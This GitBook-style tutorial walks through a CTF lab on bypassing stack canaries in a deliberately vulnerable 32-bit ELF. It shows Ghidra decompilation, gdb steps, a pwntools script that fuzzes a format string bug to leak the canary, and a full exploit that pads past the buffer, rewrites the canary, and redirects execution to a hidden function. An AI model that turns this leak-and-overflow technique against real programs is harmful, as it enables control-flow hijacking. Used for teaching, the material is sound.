---
description: 09/19/2023
---

# ðŸ´â€â˜ ï¸ Bypass Stack Canaries (Leak + Write)

> Stack canaries actually obtained their name as an analogy from miners using canaries in coal mines. This is because the birds had a much lower tolerance to carbon monoxide than humans did. So, if there was a fatal amount around, the canaries would either become unconscious or die, warning the miners that danger was near.&#x20;
>
> Similar to this case, the canaries will warn the computer that a buffer overflow has occurred from an overwritten value; crashing the program from further execution to prevent damage.

## Introduction

In this tutorial, we will be <mark style="color:yellow;">defeating stack canaries, a common mitigation technique for buffer overflows</mark>.

However, just like anything else, we can bypass them with the right effort and determination!

Simply put, <mark style="color:yellow;">**a stack canary is a randomly chosen number that sits between any buffers and the return address**</mark>.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Stack Canary Depiction</p></figcaption></figure>

#### Also check out:

{% content-ref url="memory-protections/stack-canaries.md" %}
[stack-canaries.md](memory-protections/stack-canaries.md)
{% endcontent-ref %}

### Video Reference

{% embed url="https://www.youtube.com/watch?v=TOImpHQvmpo&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&index=12&ab_channel=CryptoCat" %}

### Binary Target and Other Files

{% embed url="https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/10-bypassing_canaries" %}

## Enumeration

`file`:

{% code overflow="wrap" %}
```
canary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=9ecec437cdaead3327c28ef59456895c8ee89dd9, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

* <mark style="color:yellow;">32-bit ELF binary</mark>
* <mark style="color:yellow;">Dynamically linked</mark> to `libc`
* <mark style="color:yellow;">Non-stripped</mark>

`checksec`:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

* <mark style="color:yellow;">Partial RELRO</mark>
* <mark style="color:yellow;">Stack canary</mark> has been found
* <mark style="color:yellow;">NX enabled</mark> -- meaning we do <mark style="color:yellow;">NOT</mark> have an executable stack

## Messing with the Binary

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So, <mark style="color:yellow;">it appears that our long string does not impact the first input of the program, however the stack canary prevents us from inputting our string in the second input</mark>.

## Reversing

Throw the target binary into Ghidra.

I <mark style="color:yellow;">immediately noticed that this is a</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">**ret2win**</mark> challenge because we were missing a function inside of `main()`.

Also, this allows us to simply focus strictly on bypassing the canary protection itself.

`main()`:

```c
undefined4 main(void)

{
  int iVar1;
  undefined4 uVar2;
  int in_GS_OFFSET;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  vuln();
  uVar2 = 0;
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar2 = __stack_chk_fail_local();
  }
  return uVar2;
}
```

`vuln()`:

```c
void vuln(void)

{
  int in_GS_OFFSET;
  char local_50 [64];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  puts("You\'ll never beat my state of the art stack protector!");
  gets(local_50);
  printf(local_50);
  puts("\nWho said gets() is dangerous? Good luck with your BOF attack :P");
  gets(local_50);
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

`hacked()`:

```c
void hacked(void)

{
  int iVar1;
  int in_GS_OFFSET;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  puts("Wait, how did you get in here?!");
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

### Identifying the Canary in Ghidra

Inside of our `main()` function, I have modified the variable to identify the canary better.

Essentially, `in_GS_OFFSET` will simply generate a random value and it will call `vuln()`.&#x20;

If you were overflowing the buffer and arrived at the `vuln()` call, and then upon returning, if the canary is not equal to what it was originally set to, it will call `__stack_chk_fail_local()`, resulting in a stack smashing error, crashing the program.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><code>main()</code></p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><code>vuln()</code></p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Upon viewing the stack, we can see that we have our return pointer on the stack (`AL:1`), our local\_8, and then our canary itself.

In other words, our canary will be 64-bytes in judging from our buffer, 12 bytes after we write the 4-byte canary in order to get to the return address.

## Identifying the Canary

We can do this by fuzzing the program if there is a format string bug to leak the canary.

**Keep in mind**:&#x20;

<mark style="color:yellow;">The canary value is very random, will not start with f7/ff, and will end with 00 usually</mark>.

You will want to run this script a few times and look for elements off of the stack that are changing and randomized each time the program is run.

`fuzz.py`:

```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./canary', checksec=False)

# Let's fuzz x values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendline('%{}$p'.format(i).encode())
        p.recvline()
        # Receive the response
        result = p.recvline().decode()
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Upon running this a few times, this was the only element to be randomized and meet the criteria explained above.</p></figcaption></figure>

However, we can also use `gdb` to find this information.

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Obtaining `vuln()`'s address, viewing it's disassembly, breaking at it's `printf()`, running the program, using canary to view valid canaries on the stack, and printing 100 values in hex on the stack will allow us to be able to view the canaries on the stack as values.

We can see that we start from 0 and we count 24 elements on the stack (meaning our canary can be seen in the 23rd element of the stack).

Going back to our `fuzz.py`, we can see that this value in the 23rd element on the stack seems highly likely to be our canary. Keep in mind it will keep changing with each execution.

<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

We can see that `__stack_chk_fail_local()` will be called right after a <mark style="color:yellow;">**jump if equal**</mark> (`je` instruction) to the value of `vuln()` <mark style="color:yellow;">which has been appended with the value of our stack canary</mark>.

This means that if it fails the check, a stack smashing error will occur, crashing the program.

Let's run the program normally and pass the check.

**Break at `vuln()` and run the program**:

```
B *0x08049253

r
```

<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption><p>Running the program normally (passes check)</p></figcaption></figure>

Since we passed the check, we will jump directly to `vuln()`.

**Let's run the program and fail the check and view the disassembly**:

```
b *0x08049253

r

You'll never beat my state of the art stack protector!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Who said gets() is dangerous? Good luck with your BOF attack :P
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

<figure><img src="../.gitbook/assets/image (140).png" alt=""><figcaption><p>We can see that we do not have the tick anymore! Meaning, we failed the check!</p></figcaption></figure>

This will not call `__stack_chk_fail_local()` next.

<mark style="color:yellow;">Continued execution will result in a crashed program due to stack smashing</mark>!

<figure><img src="../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

The program will make a **syscall** to the program, and call `__pthread_kill_implementation()` to kill the program immediately.

#### So what happened?

Viewing the **disassembly** of `vuln()` one more time:

<figure><img src="../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

It is taking the canary on the stack `ebp-0xc` and subtracting the value (`0x14`) that it originally assigned to it.

<mark style="color:yellow;">Then, it will see if it is 0, meaning it is correct. If it is not 0, that means that canary is not correct and will crash the program</mark>.

## Exploitation

Since this is just a ret2win, the exploit will be rather simple:

<figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

We can use the following instructions in our exploit above.

`exploit.py`:

```python
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# First break is the address of printf() to make sure the offset of the canary is correct.
# Second break is the jump if equel (je) of the canary.
# Third break is at the return instruction to make sure everything is alligned correctly.
gdbscript = '''
init-pwndbg
b *0x0804921f
b *0x08049253
b *0x0804925e
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './canary'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 64  # Canary offset

# Leak canary value (23rd on stack)
io.sendlineafter(b'!', '%{}$p'.format(23).encode())
io.recvline()  # Blank line
canary = int(io.recvline().strip(), 16)
info('canary = 0x%x (%d)', canary, canary)

# Build payload (ret2win)
payload = flat([
    offset * b'A',  # Pad to canary (64)
    canary,  # Overwrite our leaked canary (4)
    12 * b'A',  # We need 12 more bytes in order to pad to Ret pointer (12)
    elf.symbols.hacked  # Divert execution to hacked() function -- Ret2win (64 + 4 + 12 = 80)
])

# Send the payload
io.sendlineafter(b':P', payload)

# Get our flag/shell
io.interactive()
```

**Result (jumping to our `hacked()` function)**:

<figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption><p>You can see that we jumped straight to the execution of an external function that was not included in <code>main()</code>.</p></figcaption></figure>
